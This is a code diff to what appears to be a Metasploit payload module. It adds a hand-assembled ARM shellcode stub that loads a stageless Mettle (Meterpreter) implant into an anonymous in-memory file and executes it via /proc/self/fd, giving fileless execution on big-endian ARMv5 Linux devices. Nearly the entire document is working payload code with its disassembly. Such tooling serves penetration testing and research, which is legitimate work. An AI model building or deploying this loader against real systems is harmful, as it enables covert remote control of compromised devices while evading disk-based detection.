@@ -36,6 +36,36 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('armv5b-linux-musleabi', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('armv5b-linux-musleabi', generate_config(opts)).to_binary :exec
+    in_memory_loader = [
+      0x0020a0e3, # 0x1000:	mov	r2, #0	0x0020a0e3
+      0x04202de5, # 0x1004:	str	r2, [sp, #-4]!	0x04202de5
+      0x0d00a0e1, # 0x1008:	mov	r0, sp	0x0d00a0e1
+      0x0110a0e3, # 0x100c:	mov	r1, #1	0x0110a0e3
+      0x8370a0e3, # 0x1010:	mov	r7, #0x83	0x8370a0e3
+      0xfe7087e2, # 0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+      0x000000ef, # 0x1018:	svc	#0	0x000000ef
+      0x0030a0e1, # 0x101c:	mov	r3, r0	0x0030a0e1
+      0x0d0000ea, # 0x1020:	b	#0x105c	0x0d0000ea
+      0x0e10a0e1, # 0x1024:	mov	r1, lr	0x0e10a0e1
+      0x002091e5, # 0x1028:	ldr	r2, [r1]	0x002091e5
+      0x261081e2, # 0x102c:	add	r1, r1, #0x26	0x261081e2
+      0x0470a0e3, # 0x1030:	mov	r7, #4	0x0470a0e3
+      0x000000ef, # 0x1034:	svc	#0	0x000000ef
+      0x101041e2, # 0x1038:	sub	r1, r1, #0x10	0x101041e2
+      0x303083e2, # 0x103c:	add	r3, r3, #0x30	0x303083e2
+      0x003081e5, # 0x1040:	str	r3, [r1]	0x003081e5
+      0x0e1041e2, # 0x1044:	sub	r1, r1, #0xe	0x0e1041e2
+      0x0100a0e1, # 0x1048:	mov	r0, r1	0x0100a0e1
+      0x0010a0e3, # 0x104c:	mov	r1, #0	0x0010a0e3
+      0x0020a0e3, # 0x1050:	mov	r2, #0	0x0020a0e3
+      0x0b70a0e3, # 0x1054:	mov	r7, #0xb	0x0b70a0e3
+      0x000000ef, # 0x1058:	svc	#0	0x000000ef
+      0xf0ffffeb, # 0x105c:	bl	#0x1024	0xf0ffffeb
+      payload.length,
+      0x00000123 # .word
+    ].pack('V*')
+    fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x00" * 16
+    in_memory_loader + fd_path + payload
   end
 end
